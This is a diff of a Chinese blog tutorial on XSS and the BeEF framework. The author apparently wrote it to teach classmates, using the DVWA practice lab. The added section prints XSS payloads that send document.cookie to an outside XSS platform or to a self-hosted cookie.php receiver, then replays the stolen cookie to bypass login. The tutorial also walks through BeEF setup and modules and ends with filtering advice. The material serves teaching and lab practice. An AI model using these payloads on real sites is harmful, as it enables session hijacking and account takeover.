@@ -31,9 +31,9 @@
     
     <script src="/libs/jquery/jquery.min.js"></script>
     
-<link rel="alternate" href="/atom.xml" title="简简" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><link rel="alternate" href="/atom.xml" title="简简" type="application/atom+xml">
+</head>
 
 
 <body>
@@ -468,7 +468,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-08-06
+                    2020-08-11
                 </div>
                 
 
@@ -498,9 +498,9 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <center><font color="pink" size="8" weigh:500>浅谈XSS&Beef</font></center>
+                <center><font color="pink" size="8" weigh:500>浅谈XSS&BeEF</font></center>
 
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文章产生的缘由是因为专业老师，让我给本专业的同学讲一哈SQL注入和XSS入门,为了备课，于是产生了这篇文章。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章产生的缘由是因为专业老师，让我给本专业的同学讲一哈SQL注入和XSS入门,为了备课，于是产生了这篇文章。</p>
 <h2 id="一、课程目标"><a href="#一、课程目标" class="headerlink" title="一、课程目标"></a>一、课程目标</h2><blockquote>
 <p>听完这节课你能学到些什么👇</p>
 </blockquote>
@@ -552,23 +552,26 @@
 
 #页面跳转
 <span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"https://jwt1399.top"</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="2-利用Xss获取cookie并绕过登录验证"><a href="#2-利用Xss获取cookie并绕过登录验证" class="headerlink" title="2 利用Xss获取cookie并绕过登录验证"></a>2 利用Xss获取cookie并绕过登录验证</h3><blockquote>
+<h3 id="2-利用Xss获取cookie绕过登录验证"><a href="#2-利用Xss获取cookie绕过登录验证" class="headerlink" title="2 利用Xss获取cookie绕过登录验证"></a>2 利用Xss获取cookie绕过登录验证</h3><blockquote>
 <p>web服务所使用的HTTP服务是无状态的。这就意味着，服务器无法分辨收到的请求是属于哪一个用户的，<br>需要通过cookie来对用户的身份进行标识了，用户每次对服务器发起请求时，都带上自己独有的cookie，服务器通过读取cookie信息，识别用户。</p>
 </blockquote>
-<ul>
-<li><p>首先打开1号浏览器，输入账号和密码登录DVWA,然后获取cookie</p>
-<p>​        方法一：弹窗获取</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript">  <span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>  ​        方法二：抓包获取</p>
-<p>  ​        方法三：Beef获取</p>
-</li>
-<li><p>然后打开2号路浏览器，进入到DVWA的login页面，在该页面利用cookie插件将cookie替换为我们获取到的1号浏览器的cookie，然后在URL栏中删掉login.php再回车</p>
-</li>
-<li><p>最后就可以发现未用登陆账号密码就进入了页面</p>
-</li>
-</ul>
+<p>1、首先打开1号浏览器，输入账号和密码登录DVWA,然后获取cookie</p>
+<p>方法一：XSS平台</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xss<span class="token punctuation">.</span>fbisb<span class="token punctuation">.</span>com<span class="token operator">/</span>ij7V<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>方法二：自己搭建接收平台</p>
+<p><strong>cookie.php</strong>（上传到自己服务器）</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'cookie.txt'</span><span class="token punctuation">,</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>payload:</strong></p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"http://服务器ip/cookie.php?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>获取到的 cookie 存储在 cookie.txt 中    </p>
+<p>方法三：BeEF获取</p>
+<p>2、然后打开2号路浏览器，进入到DVWA的login页面，在该页面利用cookie插件将cookie替换为我们获取到的1号浏览器的cookie，然后在URL栏中删掉login.php再回车</p>
+<p>3、最后就可以发现未用登陆账号密码就进入了页面</p>
 <p>值得注意的是：当对方进行正常logout后，再次使用该cookie是不能成功的。同时在进行替换后须在URL中进行稍许修改，因为所属的cookie不同于一个页面。</p>
-<h2 id="四、Beef-Xss"><a href="#四、Beef-Xss" class="headerlink" title="四、Beef-Xss"></a>四、Beef-Xss</h2><blockquote>
+<h2 id="四、BeEF"><a href="#四、BeEF" class="headerlink" title="四、BeEF"></a>四、BeEF</h2><blockquote>
 <p>全称是 The Browser Exploitation Framework.  web框架攻击平台，专注于利用浏览器漏洞.BeEF是我见过的最好的xss利用框架，他同时能够配合metasploit进一步渗透主机，强大的有些吓人！！!</p>
 </blockquote>
 <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><p>docker安装得先配置docker环境</p>
@@ -592,7 +595,7 @@ ruby beef<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
 <h4 id="Kali安装"><a href="#Kali安装" class="headerlink" title="Kali安装"></a>Kali安装</h4><p>老版本的Kali自带beef,但是新版的没有</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> update
 <span class="token function">apt-get</span> <span class="token function">install</span> beef-xss
-<span class="token comment" spellcheck="true">#第一次启动会让你设个密码(jwt)，账号为beef  #可以在config.yaml中修改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<span class="token comment" spellcheck="true">#第一次启动会让你设个密码(jwt)，账号为beef  #可以在/usr/share/beef-xss/config.yaml中修改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p>安装好之后在浏览器访问:<code>ip:3000/ui/panel</code> 默认用户名和密码都为<code>beef</code></p>
 <p><img src="https://i.loli.net/2020/05/04/CHwf3xEuWYKyhms.png" alt></p>
 <p><img src="https://i.loli.net/2020/05/04/sWqRwDvHuOS2TzU.png" alt></p>
@@ -664,7 +667,9 @@ ruby beef<span aria-hidden="true" class="line-numbers-rows"><span></span><span><
 4、Creates an invisible iframe
 5、Social Engineering系列，如下图，仅作演示 
 6、msf系列
-7、NetWork系列，可以用来扫描同一内网下的windows主机</code></pre><h2 id="五、修复建议"><a href="#五、修复建议" class="headerlink" title="五、修复建议"></a>五、修复建议</h2><ul>
+7、NetWork系列，可以用来扫描同一内网下的windows主机</code></pre><p>参考：</p>
+<p><a href="https://www.cnblogs.com/ssooking/p/6036494.html" target="_blank" rel="noopener">Beef安装与简单使用</a></p>
+<h2 id="五、修复建议"><a href="#五、修复建议" class="headerlink" title="五、修复建议"></a>五、修复建议</h2><ul>
 <li>将用户所提供的内容输入输出进行过滤。可以运用下面这些函数对出现XSS漏洞的参数进行过滤：</li>
 <li>PHP的htmlentities()或是htmlspecialchars()</li>
 <li>Python的cgi.escape()</li>
@@ -1500,7 +1505,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">185.1k</span>&nbsp;字
+                class="white-color">188.7k</span>&nbsp;字
             
             
             
